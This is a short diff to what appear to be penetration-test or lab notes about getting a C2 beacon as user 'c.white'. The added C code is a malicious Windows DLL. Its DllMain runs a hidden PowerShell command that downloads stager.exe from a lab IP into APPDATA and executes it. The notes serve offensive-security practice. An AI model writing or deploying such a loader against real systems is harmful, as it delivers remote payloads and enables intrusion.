@@ -771,7 +771,21 @@ This means the C code works, i just need to figure out the best way to trigger a
 # Beacon as `c.white`
 
 ```c
-
+#include <windows.h>
+		
+#pragma comment(lib, "user32.lib")
+		
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		    WinExec("powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest http://10.200.75.73/stager.exe -OutFile $env:APPDATA\\stager.exe; Start-Process $env:APPDATA\\stager.exe\"", SW_SHOW);
+		    break;
+	}
+		
+	return TRUE;
+}
 ```
 
 First ill modify the code used for the DLL, to get the stager and store it in `C:\Temp`
